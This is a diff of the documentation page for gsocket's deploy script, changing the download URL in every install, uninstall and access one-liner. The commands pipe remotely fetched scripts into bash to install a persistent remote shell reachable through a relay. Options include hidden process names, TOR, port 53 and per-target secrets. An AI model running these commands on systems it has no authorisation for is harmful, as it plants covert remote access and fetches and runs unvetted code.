@@ -17,17 +17,17 @@ Use either one of these three commands to _install_, _uninstall_, and _access_:
                 <ul>
                     <li><p><strong>Install</strong></p>
 {% highlight shell %}
-bash -c "$(curl -fsSL https://gsocket.io/x)"
+bash -c "$(curl -fsSL https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                     <li><p><strong>Uninstall</strong></p>
 {% highlight shell %}
-GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/x)"
+GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                     <li><p><strong>Access</strong></p>
 {% highlight shell %}
-S="ExampleSecretChangeMe" bash -c "$(curl -fsSL https://gsocket.io/x)"
+S="ExampleSecretChangeMe" bash -c "$(curl -fsSL https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                 </ul>
@@ -40,21 +40,21 @@ S="ExampleSecretChangeMe" bash -c "$(curl -fsSL https://gsocket.io/x)"
                 <ul>
                     <li><p><strong>Install</strong></p>
 {% highlight shell %}
-bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"
+bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                 </ul>
                 <ul>
                     <li><p><strong>Uninstall</strong></p>
 {% highlight shell %}
-GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"
+GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                 </ul>
                 <ul>
                     <li><p><strong>Access</strong></p>
 {% highlight shell %}
-S="ExampleSecretChangeMe" bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"
+S="ExampleSecretChangeMe" bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                 </ul>
@@ -90,12 +90,12 @@ Log in to the host from your workstation
                 <ul>
                     <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
 {% highlight shell %}
-GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/x)"
+GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                     <li><p><strong>Deploy with a predefined secret</strong></p>
 {% highlight shell %}
-X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
+X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                     <li><p><strong>Deploy from self-extracting shell-script <a href="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh" target="_blank">deploy-all.sh</a> without fetching any packages and using good old plain HTTP</strong></p>
@@ -116,12 +116,12 @@ GS_PORT=53 bash deploy-all.sh
                 <ul>
                     <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
 {% highlight shell %}
-GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
+GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                     <li><p><strong>Deploy with a predefined secret</strong></p>
 {% highlight shell %}
-X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"
+X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
 {% endhighlight %}
                     </li>
                     <li><p><strong>Deploy from self-extracting shell-script <a href="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh" target="_blank">deploy-all.sh</a> without fetching any packages and using good old plain HTTP</strong></p>
@@ -144,11 +144,11 @@ Useful environment variables:
 |S=|Connect to a system (or use `gs-netcat -s <secret> -il`).|
 |X=|Set a predefined secret for the installation (X like in inXstallation).|
 |GS_NOINST=1|Only start but without installing (will not survive a reboot).|
-|GSOCKET_ARGS=|Use additonal arguments. Most often used to force TOR in combination with S=, e.g. `GSOCKET_ARGS="-T" S=<secret> bash -c "$(curl -fsSLk https://gsocket.io/x)`.|
+|GSOCKET_ARGS=|Use additonal arguments. Most often used to force TOR in combination with S=, e.g. `GSOCKET_ARGS="-T" S=<secret> bash -c "$(curl -fsSLk https://gsocket.io/y)`.|
 |GS_DSTDIR=|Set the installation directory. The default is to pick the most suitable automatically. Use `find . -type d -writable`. |
 |GS_URL_BASE=|Use URL for static binaries. An alternative base is https://github.com/hackerschoice/binary/raw/main/gsocket|
 |GS_OSARCH=|Force architecture. The default is to pick the most suitable automatically.
-|GS_DEBUG=1|Verbose output and other debug related settings. Often used together with `GS_DEBUG=1 GS_NOSTART=1 GS_NOINST=1 bash -c "$(curl -fsSL https://gsocket.io/x)"`.|
+|GS_DEBUG=1|Verbose output and other debug related settings. Often used together with `GS_DEBUG=1 GS_NOSTART=1 GS_NOINST=1 bash -c "$(curl -fsSL https://gsocket.io/y)"`.|
 |GS_HIDDEN_NAME=|Use a custom hidden process name.|
 |GS_HOST=|Use a specific GSRN server (or [your own relay](https://github.com/hackerschoice/gsocket-relay/blob/main/README2.md)). Try GS_HOST=1.2.3.4|
 |GS_PORT=|Use a specific GSRN port. Try any of 22,53,67,443,7350|
@@ -237,8 +237,8 @@ gssec() {
     str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
     str="${str:0:22}"
     [[ ! -t 1 ]] && { echo "${str}"; return; }
-    echo "DEPLOY: X=${str}"' bash -c "$(curl -fsSL https://gsocket.io/x)"'
-    echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL https://gsocket.io/x)"'
+    echo "DEPLOY: X=${str}"' bash -c "$(curl -fsSL https://gsocket.io/y)"'
+    echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL https://gsocket.io/y)"'
     echo "ACCESS: gs-netcat -s ${str} -i"
 }
 {% endhighlight %}
@@ -253,8 +253,8 @@ gs-netcat -i -s $(gssec alice.com)
 gssec alice.com
 
 # Output from above's command:
-DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL https://gsocket.io/x)"
-ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL https://gsocket.io/x)"
+DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL https://gsocket.io/y)"
+ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL https://gsocket.io/y)"
 ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
 {% endhighlight %}
 
